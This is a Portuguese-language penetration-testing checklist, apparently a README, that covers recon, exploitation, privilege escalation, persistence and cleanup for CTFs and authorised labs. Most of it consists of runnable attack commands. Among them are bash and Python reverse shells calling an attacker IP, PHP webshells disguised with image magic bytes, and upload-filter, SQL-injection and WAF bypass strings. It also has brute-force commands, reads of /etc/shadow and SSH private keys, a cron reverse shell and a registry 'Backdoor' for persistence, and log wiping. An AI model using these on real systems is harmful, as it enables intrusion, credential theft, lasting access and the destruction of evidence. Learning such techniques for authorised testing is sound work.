<!-- ===================================== -->
<!--        Pentest Checklist Guide        -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/Topic-Penetration%20Testing-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Methodology-Recon%20to%20Post--Exploitation-red?style=flat-square">
  <img src="https://img.shields.io/badge/Scope-Network%20%26%20Web-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Offense-Red%20Team-black?style=flat-square">
  <img src="https://img.shields.io/badge/Defense-Detection%20%26%20Hardening-informational?style=flat-square">
</p>

---

# üß† Pentest Checklist ‚Äî Guia Pr√°tico de Testes de Intrus√£o

> Checklist t√©cnico e operacional para **testes de penetra√ß√£o (Pentest)**, cobrindo todas as fases do ataque ‚Äî desde **reconhecimento e enumera√ß√£o**, passando por **explora√ß√£o de vulnerabilidades**, at√© **p√≥s-explora√ß√£o, escalonamento de privil√©gios, movimento lateral e limpeza**.
>
> Este documento foi estruturado para servir como **guia de apoio pr√°tico** em **CTFs, laborat√≥rios controlados, estudos pessoais e ambientes autorizados**, seguindo uma abordagem **realista e orientada a metodologia**.

---

## üìå Metadados

- **Categoria:** Pentest ¬∑ Red Team ¬∑ Offensive Security  
- **Escopo:** Web ¬∑ Network ¬∑ Linux ¬∑ Windows  
- **Metodologia:** Recon ‚Üí Explora√ß√£o ‚Üí P√≥s-Explora√ß√£o  
- **Ferramentas:** Nmap ¬∑ Gobuster ¬∑ FFuF ¬∑ SQLMap ¬∑ Hydra ¬∑ LinPEAS ¬∑ WinPEAS  
- **Ambiente:** Labs controlados ¬∑ CTFs ¬∑ Estudos educacionais  

---

## üè∑Ô∏è Tags

`#Pentest` `#RedTeam` `#OffensiveSecurity` `#Reconnaissance`  
`#WebPentest` `#NetworkPentest` `#PrivilegeEscalation`  
`#PostExploitation` `#CTF` `#CyberSecurity`

---

## ‚ö†Ô∏è Aviso Legal

> Todo o conte√∫do apresentado neste documento deve ser utilizado **exclusivamente em ambientes autorizados**, como **laborat√≥rios, CTFs ou sistemas sob permiss√£o expl√≠cita**.  
> O uso indevido das t√©cnicas aqui descritas pode ser **ilegal**.

---

## Fase 1: Reconhecimento

### 1. Mapeamento de Rede e Portas

```bash
# Escaneamento b√°sico
nmap -sV -sC <alvo>                 # Vers√£o de servi√ßos + scripts padr√£o
nmap -p- <alvo>                     # Todas as portas TCP
nmap -sU -p 1-1000 <alvo>           # Scan UDP em portas comuns
nmap -sS -sV -O <alvo>              # SYN scan + OS fingerprinting
nmap -A -T4 <alvo>                  # Scan agressivo (+ scripts, OS, vers√£o)
nmap --script=vuln <alvo>           # Scan de vulnerabilidades

# Identifica√ß√£o de servi√ßos
netcat -nv <alvo> <porta>           # Conex√£o manual TCP
nc -nvu <alvo> <porta>              # Conex√£o manual UDP
```

### 2. Enumera√ß√£o Web

```bash
# Enumera diret√≥rios
gobuster dir -u http://<alvo> -w /usr/share/wordlists/dirb/common.txt

# Enumera diret√≥rios E procura por arquivos com extens√µes espec√≠ficas
gobuster dir -u http://<alvo> -x php,txt,html -w wordlist.txt

# Testa m√∫ltiplos caminhos em paralelo
ffuf -u http://<alvo>/FUZZ -w wordlist.txt

# Fuzzing web com extens√µes espec√≠ficas
ffuf -u http://<alvo>/FUZZ -w wordlist.txt -e .php,.txt,.bak

# Enumera√ß√£o de subdom√≠nios via DNS brute force
gobuster dns -d <dominio> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Descobre subdom√≠nios ativos testando conex√µes HTTP
ffuf -u http://FUZZ.<dominio> -w wordlist.txt
```

### 3. Reconhecimento de Aplica√ß√µes Web

```bash
# Informa√ß√µes gerais
whatweb <alvo>                       # Tecnologias web
nikto -h http://<alvo>               # Scan de vulnerabilidades web
dirb http://<alvo>                   # Busca de diret√≥rios (alternativa)
wpscan --url http://<alvo>           # Scan WordPress
joomscan -u http://<alvo>            # Scan Joomla
```

### 4. Coleta de Informa√ß√µes Externas

```bash
# DNS
dig <dominio> ANY                    # Todos os registros DNS
dig axfr @<dns-server> <dominio>     # Teste de transfer√™ncia de zona
nslookup -type=any <dominio>
host <alvo>
dnsrecon -d <dominio>

# Metadados
theharvester -d <dominio> -l 100 -b google  # Coleta de emails/subdom√≠nios
whois <dominio>                             # Informa√ß√µes de registro
```

---
## Fase 2: Vulnerabilidades/Explora√ß√£o

### 1. Explora√ß√£o de Servi√ßos

```bash
# FTP
ftp <alvo>                           # Conex√£o manual
anonymous/anonymous                  # Login comum FTP an√¥nimo

# SMB/Samba
smbclient -L //<alvo>/               # Lista shares
smbclient //<alvo>/<share>           # Conex√£o a share espec√≠fica
smbmap -H <alvo>                     # Enumera√ß√£o SMB
enum4linux -a <alvo>                 # Enumera√ß√£o Windows/Samba

# SSH
ssh <user>@<alvo>                    # Conex√£o padr√£o
ssh -i chave.pem <user>@<alvo>       # Conex√£o com chave privada

# RDP
xfreerdp /u:user /v:<alvo>           # Conex√£o RDP
rdesktop <alvo>

# MySQL/MariaDB
mysql -h <alvo> -u user -p           # Conex√£o MySQL
```

### 2. Varredura de Vulnerabilidades

```bash
# Automa√ß√£o
nmap --script=vulners <alvo>         # Busca CVEs
searchsploit <servi√ßo/vers√£o>        # Busca exploits no Exploit-DB
searchsploit -m <id_exploit>         # Copia exploit para diret√≥rio atual

# SQL Injection
sqlmap -u "http://<alvo>/pagina?id=1" --dbs  # Teste automatizado
sqlmap -u "http://<alvo>/pagina?id=1" -D db -T users --dump  # Dump de dados
```

### 3. Upload/Execu√ß√£o de Shells

```bash
# Shells comuns
bash -i >& /dev/tcp/<seu-ip>/<porta> 0>&1  # Reverse shell bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<seu-ip>",<porta>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- [Simple PHP WebShell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985)
- [Reverse Shell Generator](https://www.revshells.com/)

```bash
# Transfer√™ncia de arquivos
python3 -m http.server 80            # Servidor web python
wget http://<seu-ip>/arquivo         # Download via wget
curl -O http://<seu-ip>/arquivo      # Download via curl
nc -lvnp <porta> > arquivo           # Receber com netcat (m√°quina atacante)
nc -w 3 <alvo> <porta> < arquivo     # Enviar com netcat
```

### 4. Bypass de Valida√ß√£o de Arquivos

```bash
# M√©todo simplificado
mv file.php > newfile.png     # Alterar extens√£o
file newfile.png              # Verificar o tipo real
nano newfile.png              # Para dicionar Magic Bytes
```

- [Lista de assinaturas de arquivos](https://en.wikipedia.org/wiki/List_of_file_signatures)

```bash
# Magic bytes para upload de shells
echo -e "\x89PNG\r\n\x1a\n<?php system(\$_GET['cmd']); ?>" > shell.png.php
echo "GIF8<?php system(\$_GET['cmd']); ?>" > shell.gif.php
echo -e "\xff\xd8\xff\xe0<?php system(\$_GET['cmd']); ?>" > shell.jpg.php

# Bypass de extens√£o
file.php.jpg                       # Extens√£o dupla
file.php%00.jpg                    # Null byte (depende da vers√£o PHP)
file.pHp                           # Case variation
file.php;.jpg                      # Adi√ß√£o de ponto e v√≠rgula
file.php.jpg.jpg                   # Extens√£o m√∫ltipla

# Bypass de tipo MIME
# Editar cabe√ßalhos HTTP no Burp Suite/Proxy:
Content-Type: image/png
Content-Type: application/octet-stream

# Bypass de conte√∫do (evas√£o de assinatura)
# Inserir coment√°rios em arquivos PHP
<?php // PNG HEADER WILL GO HERE ?>
<?php /* GIF87a */ system($_GET['cmd']); ?>

# Ferramentas automatizadas
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagem.jpg
mv imagem.jpg imagem.php.jpg

# Outros m√©todos
file.phar                          # Phar wrapper (PHP)
file.phtml                         # Extens√£o alternativa PHP
file.shtml                         # Server-side includes
file.php5, file.php7               # Vers√µes espec√≠ficas
file.php%20                        # URL encoding
file.php?.jpg                      # Query string bypass
```

### 5. Brute Force em Formul√°rios e Servi√ßos

```bash
# Hydra - HTTP/HTTPS forms
hydra -L users.txt -P passwords.txt <alvo> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
hydra -l admin -P rockyou.txt <alvo> https-post-form "/admin/login:username=^USER^&password=^PASS^:Invalid"

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://<alvo> -t 4
hydra -l root -P passwords.txt <alvo> ssh

# Hydra - FTP
hydra -L users.txt -P passwords.txt ftp://<alvo>
hydra -l anonymous -P passwords.txt <alvo> ftp

# Hydra - SMB
hydra -L users.txt -P passwords.txt <alvo> smb

# Medusa (alternativa)
medusa -h <alvo> -U users.txt -P passwords.txt -M http -m DIR:/admin
medusa -h <alvo> -u admin -P passwords.txt -M ssh

# Patator (mais flex√≠vel)
patator http_fuzz url=http://<alvo>/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Login failed'

# Wfuzz (para web)
wfuzz -c -z file,users.txt -z file,passwords.txt -d "user=FUZZ&pass=FUZ2Z" http://<alvo>/login.php

# Ncrack (RDP, SSH, etc)
ncrack -U users.txt -P passwords.txt rdp://<alvo>
ncrack -U users.txt -P passwords.txt ssh://<alvo>:22
```

### 6. SQL Injection para Bypass de Login

```bash
# Bypass cl√°ssico de login
admin' -- -                           # Coment√°rio no final
admin' OR '1'='1' -- -
admin' OR 1=1 -- -
admin') OR ('1'='1                    # Com par√™nteses
' OR 1=1 -- -
```

```bash
# Bypass com UNION
' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99' -- -
# Onde o hash √© MD5 de 'password'
```

```bash
# SQL Injection Blind para extra√ß√£o de credenciais
# Usando sqlmap:
sqlmap -u "http://<alvo>/login.php" --data="user=admin&pass=test" --level=5 --risk=3 --dbms=mysql --technique=B --dump -T users
```

```bash
# Bypass com LIKE
admin' OR username LIKE 'a%' -- -
' OR username LIKE '%admin%' -- -
```

```bash
# Bypass com coment√°rios alternativos
admin'/*
admin'#
admin'-- -
```

```bash
# Bypass de WAF (Web Application Firewall)
AdmIn' OR '1'='1'                     # Case variation
admin'||'1'='1'                       # OR com pipes
admin'&&'1'='1'                       # AND l√≥gico
%61%64%6d%69%6e' OR '1'='1            # URL encoding
admin%c0%a7' OR '1'='1                // UTF-8 encoding
```

- [Lista para SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

### 7. Wordlists e Dicion√°rios Comuns

```bash
# Wordlists padr√£o no Kali
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt

# Gera√ß√£o de wordlists personalizadas
crunch 6 8 0123456789 -o numeros.txt          # N√∫meros de 6-8 d√≠gitos
cewl http://<alvo> -w custom_words.txt        # Extrai palavras do site
john --wordlist= --rules --stdout > mutado.txt  # Aplica regras a wordlist
```

### 8. Evas√£o de WAF/IDS

```bash
# Fragmenta√ß√£o de requisi√ß√µes
nmap -f <alvo>                        # Pacotes fragmentados
nmap --mtu 8 <alvo>                   # Tamanho espec√≠fico MTU

# Timing de ataques
nmap -T1 <alvo>                       # Scan muito lento
nmap --scan-delay 5s <alvo>           # Delay entre pacotes
sqlmap --delay=3 --time-sec=5         # Delay em SQL injection

# Codifica√ß√£o de payloads
# URL encoding
admin%27%20OR%20%271%27%3D%271

# Double URL encoding
admin%2527%2520OR%2520%25271%2527%253D%25271

# Unicode encoding
admin\u0027 OR \u00271\u0027=\u00271

# HTML encoding
admin&#39; OR &#39;1&#39;=&#39;1

# Hex encoding
0x61646d696e27204f52202731273d2731

# Ferramentas para bypass
# SQLMap com t√©cnicas de evas√£o
sqlmap -u "http://<alvo>/" --tamper=space2comment,charencode --random-agent
sqlmap --list-tampers                # Lista todos os tampers dispon√≠veis

# Nmap com evas√£o
nmap -sS -T2 --max-hostgroup 1 --max-parallelism 10 --data-length 200 <alvo>
```

---
## Fase 3: P√≥s-Explora√ß√£o

### 1. Escalonamento de Privil√©gios - Linux

```bash
# Coleta de informa√ß√µes
whoami && id                         # Usu√°rio atual
uname -a                             # Info do kernel
cat /etc/os-release                  # Distribui√ß√£o Linux
hostname                             # Nome do host

# Busca por credenciais
find / -name "*.txt" -type f 2>/dev/null | grep -i pass
find / -name "*.php" -type f 2>/dev/null | xargs grep -i "password"
find / -type d -name "*backup*" 2>/dev/null
find / -type f -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null | head -20

grep -r "password" /home/ /var/www/ 2>/dev/null
cat ~/.bash_history                      # Hist√≥rico de comandos
```

```bash
# Permiss√µes SUID/GUID
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # GUID
find / -perm /6000 -type f 2>/dev/null   # Ambos
```
- [GTFOBins](https://gtfobins.org/): Lista de bin√°rios (comandos/programas) Unix que podem ser utilizados indevidamente para contornar restri√ß√µes de seguran√ßa local em sistemas mal configurados

```bash
# Busca de arquivos sens√≠veis
ls -la /etc/passwd /etc/shadow           # Arquivos de usu√°rios
cat /etc/passwd | grep -v nologin        # Usu√°rios com shell

# Scripts automatizados
linpeas.sh                           # Linux Privilege Escalation Awesome Script
linenum.sh                           # Enumera√ß√£o Linux
pspy                                 # Monitoramento de processos
```

### 2. Escalonamento de Privil√©gios - Windows

```bash
# Comandos b√°sicos
whoami /priv                         # Privil√©gios do usu√°rio
systeminfo                           # Informa√ß√µes do sistema
net user                             # Lista usu√°rios
net localgroup administrators        # Lista administradores
netstat -ano                         # Conex√µes ativas

# Busca de credenciais
findstr /si password *.txt *.xml *.ini *.config 2>nul
dir /s *pass* == *cred* == *vnc* == *.config* 2>nul

# Scripts automatizados
winpeas.bat                          # Windows Privilege Escalation Awesome Script
windows-exploit-suggester.py         # Sugest√£o de exploits
Seatbelt.exe                         # Coleta de informa√ß√µes
```


### 3. Bypass de Controles de Seguran√ßa

```bash
# Bypass de AppArmor/SELinux
aa-status                            # Verifica status AppArmor
getenforce                           # Verifica status SELinux
ps Zaux | grep -E "(httpd|apache|nginx)"  # Verifica contexto SELinux

# Desabilita√ß√£o tempor√°ria (se poss√≠vel)
setenforce 0                         # Desativa SELinux (Permissivo)
apparmor_parser -R /etc/apparmor.d/usr.sbin.apache2  # Descarrega perfil

# Bypass de restri√ß√µes de shell
python3 -c "import os; os.system('/bin/bash')"
perl -e 'exec "/bin/bash";'
echo os.system('/bin/bash')
```

### 4. Movimento Lateral

```bash
# Dump de senhas
cat /etc/shadow                      # Linux shadow file (precisa de root)
unshadow passwd shadow > combined    # Prepara para john
john --wordlist=/usr/share/wordlists/rockyou.txt combined  # Quebra de hash

# SSH keys
cat ~/.ssh/id_rsa                    # Chave privada SSH
cat ~/.ssh/authorized_keys           # Chaves autorizadas

# T√∫neis e pivoting
ssh -L 8080:localhost:80 user@<alvo>  # Port forwarding
chisel client <seu-ip>:<porta> socks  # Ferramenta para pivoting
```

### 5. Persist√™ncia

```bash
# Linux
crontab -l                           # Lista cron jobs
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<porta> 0>&1'" >> /tmp/cronjob
crontab /tmp/cronjob                 # Adiciona reverse shell no cron

# Windows
schtasks /create /sc minute /mo 1 /tn "TaskName" /tr "C:\shell.exe"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "Backdoor" /t REG_SZ /d "C:\shell.exe"
```

---
## Fase 4: Coleta de Dados/An√°lise

### 1. Coleta de Dados Sens√≠veis

```bash
# Linux
find / -type f -name "*.sql" -o -name "*.db" -o -name "*.sqlite" 2>/dev/null
find /home /var/www -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.doc*" \) 2>/dev/null
cat /var/log/auth.log | grep "Accepted"  # Logins SSH bem-sucedidos

# Configura√ß√µes de aplica√ß√µes
ls -la /var/www/html/*config*.php 2>/dev/null
find / -name ".env" -type f 2>/dev/null  # Arquivos de ambiente
```

### 2. An√°lise de Logs

```bash
# Linux logs importantes
cat /var/log/auth.log                 # Autentica√ß√µes
cat /var/log/syslog                   # Logs do sistema
tail -f /var/log/apache2/access.log   # Logs web Apache
tail -f /var/log/nginx/access.log     # Logs web Nginx

# Filtrando logs
grep "Failed password" /var/log/auth.log      # Logins SSH falhos
grep "POST\|GET" /var/log/apache2/access.log  # Requisi√ß√µes web
```

---
## Fase 5: Limpeza/Finaliza√ß√£o

### 1. Limpeza de Evid√™ncias

```bash
# Linux
history -c                           # Limpa hist√≥rico do bash
shred -u arquivo                     # Apaga arquivo permanentemente
rm -f ~/.bash_history                # Remove hist√≥rico

# Remove arquivos tempor√°rios
rm -f /tmp/shell.php /tmp/linpeas.sh

# Remove logs
echo "" > /var/log/auth.log
```

### 2. Monitoramento

```bash
# Monitoramento de processos
ps aux | grep -E "(sh|bash|python|perl|nc|netcat)"  # Processos suspeitos
lsof -i -P -n | grep LISTEN          # Portas abertas
netstat -tulpn                       # Conex√µes ativas

# Monitoramento de arquivos
watch -n 2 'ls -la /tmp'             # Monitora diret√≥rio
inotifywait -m /tmp                  # Monitora mudan√ßas
```

---
## B√¥nus: Comandos √öteis Gerais

```bash
# Manipula√ß√£o de arquivos
grep -r "padr√£o" /caminho/           # Busca recursiva
awk '/padr√£o/ {print $1}' arquivo    # Processamento de texto
sed 's/antigo/novo/g' arquivo        # Substitui√ß√£o de texto

# Compacta√ß√£o/descompacta√ß√£o
tar -czf arquivo.tar.gz pasta/       # Compacta
tar -xzf arquivo.tar.gz              # Descompacta
zip -r arquivo.zip pasta/            # Cria zip
unzip arquivo.zip                    # Extrai zip

# Transfer√™ncia de arquivos base64
base64 arquivo > arquivo.b64         # Codifica
base64 -d arquivo.b64 > arquivo      # Decodifica

# Python simples
python3 -c "import pty; pty.spawn('/bin/bash')"  # Upgrade shell
```

